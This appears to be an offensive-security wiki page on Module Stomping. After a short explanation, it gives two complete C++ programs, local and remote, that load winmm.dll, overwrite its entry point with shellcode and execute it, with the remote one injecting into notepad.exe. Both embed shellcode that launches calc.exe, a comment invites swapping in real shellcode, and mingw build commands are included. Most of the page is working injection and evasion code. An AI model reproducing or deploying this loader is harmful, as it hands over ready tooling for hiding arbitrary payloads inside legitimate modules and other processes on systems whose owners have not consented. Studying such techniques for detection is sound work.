# Module Stomping Shellcode Injection

## Theory

**Module Stomping** is an advanced **defense evasion** technique where an attacker loads a legitimate DLL into memory and then overwrites its executable code (usually the `.text` section or entry point) with **malicious shellcode**. Since the DLL remains mapped in the process memory, traditional security tools might overlook the malicious modifications, assuming it is a legitimate module.

This technique is effective because:

* The DLL remains registered in the **PEB (Process Environment Block)**
* Memory scanners may not flag it as suspicious since it appears as a **legitimate loaded module**
* Overwriting the `.text` section allows execution of **arbitrary code**

#### Execution Flow

1. Injects some benign Windows DLL into a remote or local process
2. Overwrites DLL's, loaded in step 1, `AddressOfEntryPoint` point with shellcode
3. Starts a new thread in the target process at the benign DLL's entry point, where the shellcode has been written to, during step 2

## Practice

{% tabs %}
{% tab title="C++ (Local Process)" %}
The following code implements Module Stomping by loading the `winmm.dll` into the current process, and overwrite its .text section with our shellcode.

{% code title="ModuleStomping.cpp" %}
```cilkcpp
#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <tchar.h>
#include <string>

// Add these typedefs and function declarations for the NT functions
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef HMODULE (WINAPI *pLoadLibraryExW)(
    LPCWSTR lpLibFileName,
    HANDLE hFile,
    DWORD dwFlags
);

// Define NTSTATUS if not already defined
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

// Define DONT_RESOLVE_DLL_REFERENCES if not already defined
#ifndef DONT_RESOLVE_DLL_REFERENCES
#define DONT_RESOLVE_DLL_REFERENCES 0x00000001
#endif

DWORD WINAPI esc_main(LPVOID lpParameter)
{
    // Shellcode - replace with your actual shellcode
    // calc.exe
    unsigned char decoded[] = {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00};
    SIZE_T length = sizeof(decoded);

    // Load NT functions dynamically
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        std::cerr << "Failed to get handle to ntdll.dll" << std::endl;
        return 1;
    }
    
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    
    if (!NtWriteVirtualMemory || !NtProtectVirtualMemory) {
        std::cerr << "Failed to get addresses of NT functions" << std::endl;
        return 1;
    }

    // Get handle to kernel32.dll to use LoadLibraryExW
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        std::cerr << "Failed to get handle to kernel32.dll" << std::endl;
        return 1;
    }

    pLoadLibraryExW LoadLibraryExW = (pLoadLibraryExW)GetProcAddress(hKernel32, "LoadLibraryExW");
    if (!LoadLibraryExW) {
        std::cerr << "Failed to get address of LoadLibraryExW" << std::endl;
        return 1;
    }

    // Choose a DLL to stomp - using a non-critical DLL
    const wchar_t* dllToStomp = L"winmm.dll";
    
    std::cout << "Loading a fresh copy of the DLL for stomping..." << std::endl;
    
    // Load a fresh copy of the DLL with DONT_RESOLVE_DLL_REFERENCES flag
    // This loads the DLL but doesn't execute its initialization routines
    HMODULE hModule = LoadLibraryExW(dllToStomp, NULL, DONT_RESOLVE_DLL_REFERENCES);
    
    if (!hModule) {
        std::cerr << "Failed to load module for stomping. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Get module information
    MODULEINFO moduleInfo;
    if (!GetModuleInformation(GetCurrentProcess(), hModule, &moduleInfo, sizeof(moduleInfo))) {
        std::cerr << "Failed to get module information. Error: " << GetLastError() << std::endl;
        FreeLibrary(hModule);
        return 1;
    }

    std::cout << "Successfully loaded module at address: 0x" << std::hex << moduleInfo.lpBaseOfDll << std::endl;
    std::cout << "Module size: " << std::dec << moduleInfo.SizeOfImage << " bytes" << std::endl;

    // Find the .text section to overwrite
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleInfo.lpBaseOfDll;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)moduleInfo.lpBaseOfDll + dosHeader->e_lfanew);
    
    // Find the entry point
    PVOID targetAddress = (PVOID)((BYTE*)moduleInfo.lpBaseOfDll + ntHeader->OptionalHeader.AddressOfEntryPoint);
    
    // If entry point is not suitable, use a fixed offset
    if (!targetAddress) {
        targetAddress = (PVOID)((BYTE*)moduleInfo.lpBaseOfDll + 0x1000); // Skip PE header
    }

    std::cout << "Target address for stomping: 0x" << std::hex << targetAddress << std::endl;

    // Change memory protection to allow writing
    HANDLE hProc = GetCurrentProcess();
    DWORD oldProtect = 0;
    PVOID baseAddress = targetAddress;
    SIZE_T regionSize = length;
    NTSTATUS status;

    status = NtProtectVirtualMemory(hProc, &baseAddress, &regionSize, PAGE_READWRITE, &oldProtect);
    if (status != 0) {
        std::cerr << "NtProtectVirtualMemory failed with status: " << std::hex << status << std::endl;
        FreeLibrary(hModule);
        return 1;
    }

    // Write shellcode to the module's memory
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(hProc, targetAddress, decoded, length, &bytesWritten);
    if (status != 0) {
        std::cerr << "NtWriteVirtualMemory failed with status: " << std::hex << status << std::endl;
        FreeLibrary(hModule);
        return 1;
    }

    std::cout << "Successfully wrote " << std::dec << bytesWritten << " bytes to the module" << std::endl;

    // Restore original memory protection
    status = NtProtectVirtualMemory(hProc, &baseAddress, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        std::cerr << "Failed to restore memory protection. Status: " << std::hex << status << std::endl;
        FreeLibrary(hModule);
        return 1;
    }

    std::cout << "Executing stomped module code..." << std::endl;

    // Execute the shellcode
    FARPROC stomped_func = (FARPROC)targetAddress;
    stomped_func();

    std::cout << "Execution completed" << std::endl;
    
    // Optionally free the library when done
    // FreeLibrary(hModule);
    
    return 0;
}

int main()
{
    esc_main(NULL);
    return 0;
} 
```
{% endcode %}

We can compile it from linux using following command

```bash
x86_64-w64-mingw32-g++ ModuleStomping.cpp -o ModuleStomping.exe -std=c++20 -static
```
{% endtab %}

{% tab title="C++ (Remote Process)" %}
The following code implements Module Stomping by loading the `winmm.dll` into a remote `notepad.exe` process, and overwrite its .text section with our shellcode.

{% code title="ModuleStomping.cpp" %}
```cilkcpp
#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <tchar.h>
#include <string>

// NT API typedefs and structures
typedef LONG NTSTATUS;

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// NT API function typedefs
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS (NTAPI *pNtWaitForSingleObject)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

typedef NTSTATUS (NTAPI *pNtClose)(
    HANDLE Handle
);

typedef NTSTATUS (NTAPI *pNtFreeVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
);

typedef HMODULE (WINAPI *pLoadLibraryExW)(
    LPCWSTR lpLibFileName,
    HANDLE hFile,
    DWORD dwFlags
);

// Define DONT_RESOLVE_DLL_REFERENCES if not already defined
#ifndef DONT_RESOLVE_DLL_REFERENCES
#define DONT_RESOLVE_DLL_REFERENCES 0x00000001
#endif

// Function to find a process by name
DWORD FindProcessId(const wchar_t* processName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W processEntry;
        processEntry.dwSize = sizeof(processEntry);
        
        if (Process32FirstW(snapshot, &processEntry)) {
            do {
                if (_wcsicmp(processEntry.szExeFile, processName) == 0) {
                    pid = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }
    
    return pid;
}

DWORD WINAPI esc_main(LPVOID lpParameter)
{
    //calc.exe shellcode
    unsigned char decoded[] = {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00};
    SIZE_T length = sizeof(decoded);
    
    // Load NT functions dynamically
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        std::cerr << "Failed to get handle to ntdll.dll" << std::endl;
        return 1;
    }
    
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pNtWaitForSingleObject NtWaitForSingleObject = (pNtWaitForSingleObject)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    pNtClose NtClose = (pNtClose)GetProcAddress(hNtdll, "NtClose");
    pNtFreeVirtualMemory NtFreeVirtualMemory = (pNtFreeVirtualMemory)GetProcAddress(hNtdll, "NtFreeVirtualMemory");
    
    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory || 
        !NtCreateThreadEx || !NtWaitForSingleObject || !NtClose || !NtFreeVirtualMemory) {
        std::cerr << "Failed to get addresses of NT functions" << std::endl;
        return 1;
    }

    HANDLE hProc = NULL;
    HANDLE hThread = NULL;
    DWORD oldProtect = 0;
    NTSTATUS status;

    // Find a target process - for example, notepad.exe
    const wchar_t* targetProcess = L"notepad.exe";
    DWORD pid = FindProcessId(targetProcess);
    
    if (pid == 0) {
        std::wcout << L"Target process " << targetProcess << L" not found. Please start it first." << std::endl;
        return 1;
    }
    
    std::cout << "Found target process with PID: " << pid << std::endl;
    
    // Open the target process with all access
    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        std::cerr << "Failed to open target process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Validate that we have a valid process handle
    if (hProc == NULL) {
        std::cerr << "No valid target process handle provided" << std::endl;
        return 1;
    }

    // Choose a single DLL to inject and stomp
    const char* dllToStomp = "C:\\Windows\\System32\\winmm.dll";
    std::cout << "Attempting to inject: " << dllToStomp << std::endl;
    
    // Allocate memory for the DLL path in the remote process
    size_t pathLen = strlen(dllToStomp) + 1;
    PVOID remoteBuffer = NULL;
    SIZE_T regionSize = pathLen;
    
    status = NtAllocateVirtualMemory(hProc, &remoteBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        std::cerr << "NtAllocateVirtualMemory failed with status: 0x" << std::hex << status << std::endl;
        CloseHandle(hProc);
        return 1;
    }

    // Write the DLL path to the remote process
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(hProc, remoteBuffer, (PVOID)dllToStomp, pathLen, &bytesWritten);
    if (status != 0) {
        std::cerr << "NtWriteVirtualMemory failed with status: 0x" << std::hex << status << std::endl;
        NtFreeVirtualMemory(hProc, &remoteBuffer, &regionSize, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    // Get address of LoadLibraryA
    PVOID loadLibraryAddr = (PVOID)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!loadLibraryAddr) {
        std::cerr << "Failed to get address of LoadLibraryA. Error: " << GetLastError() << std::endl;
        NtFreeVirtualMemory(hProc, &remoteBuffer, &regionSize, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    // Create a remote thread to load the DLL
    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProc, loadLibraryAddr, remoteBuffer, 0, 0, 0, 0, NULL);
    if (status != 0) {
        std::cerr << "NtCreateThreadEx failed with status: 0x" << std::hex << status << std::endl;
        NtFreeVirtualMemory(hProc, &remoteBuffer, &regionSize, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    // Wait for the thread to complete
    status = NtWaitForSingleObject(hThread, FALSE, NULL);
    if (status != 0) {
        std::cerr << "NtWaitForSingleObject failed with status: 0x" << std::hex << status << std::endl;
    }
    NtClose(hThread);
    
    std::cout << "DLL injection thread completed, checking if module was loaded..." << std::endl;
    
    // Extract just the filename from the path for comparison
    char filename[MAX_PATH] = {0};
    const char* lastSlash = strrchr(dllToStomp, '\\');
    if (lastSlash) {
        strcpy_s(filename, sizeof(filename), lastSlash + 1);
    } else {
        strcpy_s(filename, sizeof(filename), dllToStomp);
    }
    
    // Free the remote buffer as we don't need it anymore
    NtFreeVirtualMemory(hProc, &remoteBuffer, &regionSize, MEM_RELEASE);
    
    // Find the injected module in the remote process
    HMODULE remoteModule = NULL;
    HMODULE hModules[1024] = {0};
    DWORD cbNeeded = 0;
    char moduleName[MAX_PATH] = {0};
    
    if (EnumProcessModules(hProc, hModules, sizeof(hModules), &cbNeeded)) {
        for (unsigned int j = 0; j < (cbNeeded / sizeof(HMODULE)); j++) {
            if (GetModuleFileNameExA(hProc, hModules[j], moduleName, sizeof(moduleName))) {
                // Check if the module name contains our DLL name
                if (strstr(moduleName, filename) != nullptr) {
                    remoteModule = hModules[j];
                    std::cout << "Found module " << filename << " at address 0x" << std::hex << remoteModule << std::endl;
                    break;
                }
            }
        }
    }
    
    if (!remoteModule) {
        std::cerr << "Failed to find injected module in remote process" << std::endl;
        CloseHandle(hProc);
        return 1;
    }

    // Read the PE header from the remote process
    DWORD headerBufferSize = 0x1000;
    LPVOID headerBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);
    if (!headerBuffer) {
        std::cerr << "Failed to allocate memory for PE header. Error: " << GetLastError() << std::endl;
        CloseHandle(hProc);
        return 1;
    }
    
    if (!ReadProcessMemory(hProc, remoteModule, headerBuffer, headerBufferSize, NULL)) {
        std::cerr << "Failed to read PE header from remote process. Error: " << GetLastError() << std::endl;
        HeapFree(GetProcessHeap(), 0, headerBuffer);
        CloseHandle(hProc);
        return 1;
    }
    
    // Parse the PE header to find the entry point
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headerBuffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headerBuffer + dosHeader->e_lfanew);
    DWORD_PTR entryPointOffset = ntHeader->OptionalHeader.AddressOfEntryPoint;
    LPVOID entryPoint = (LPVOID)((DWORD_PTR)remoteModule + entryPointOffset);
    
    std::cout << "Module entry point offset: 0x" << std::hex << entryPointOffset << std::endl;
    std::cout << "Module entry point address: 0x" << std::hex << entryPoint << std::endl;
    
    // Write shellcode to the module's entry point
    std::cout << "Writing shellcode to module entry point..." << std::endl;
    
    // Change memory protection to allow writing
    PVOID protectAddress = entryPoint;
    SIZE_T protectSize = length;
    status = NtProtectVirtualMemory(hProc, &protectAddress, &protectSize, PAGE_READWRITE, &oldProtect);
    if (status != 0) {
        std::cerr << "NtProtectVirtualMemory failed with status: 0x" << std::hex << status << std::endl;
        HeapFree(GetProcessHeap(), 0, headerBuffer);
        CloseHandle(hProc);
        return 1;
    }
    
    // Write shellcode to the module's entry point
    status = NtWriteVirtualMemory(hProc, entryPoint, decoded, length, &bytesWritten);
    if (status != 0) {
        std::cerr << "NtWriteVirtualMemory failed with status: 0x" << std::hex << status << std::endl;
        HeapFree(GetProcessHeap(), 0, headerBuffer);
        CloseHandle(hProc);
        return 1;
    }
    
    std::cout << "Successfully wrote " << std::dec << bytesWritten << " bytes to the module entry point" << std::endl;
    
    // Restore original memory protection
    status = NtProtectVirtualMemory(hProc, &protectAddress, &protectSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        std::cerr << "Failed to restore memory protection. Status: 0x" << std::hex << status << std::endl;
        HeapFree(GetProcessHeap(), 0, headerBuffer);
        CloseHandle(hProc);
        return 1;
    }
    
    // Free the header buffer
    HeapFree(GetProcessHeap(), 0, headerBuffer);
    
    // Execute the shellcode by creating a thread at the entry point
    std::cout << "Executing shellcode from module entry point..." << std::endl;
    
    // Use NtCreateThreadEx instead of CreateRemoteThread
    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProc, (PVOID)entryPoint, NULL, 0, 0, 0, 0, NULL);
    if (status != 0) {
        std::cerr << "NtCreateThreadEx failed with status: 0x" << std::hex << status << std::endl;
        CloseHandle(hProc);
        return 1;
    }
    
    // Wait for the thread to complete using NtWaitForSingleObject
    status = NtWaitForSingleObject(hThread, FALSE, NULL);
    if (status != 0) {
        std::cerr << "NtWaitForSingleObject failed with status: 0x" << std::hex << status << std::endl;
    }
    
    // Close the thread handle
    NtClose(hThread);
    CloseHandle(hProc);
    
    std::cout << "Execution completed in remote process" << std::endl;
    
    return 0;
}

int main()
{
    esc_main(NULL);
    return 0;
}
```
{% endcode %}

We can compile it from linux using following command

```bash
x86_64-w64-mingw32-g++ ModuleStomping.cpp -o ModuleStomping.exe -std=c++20 -static
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection" %}
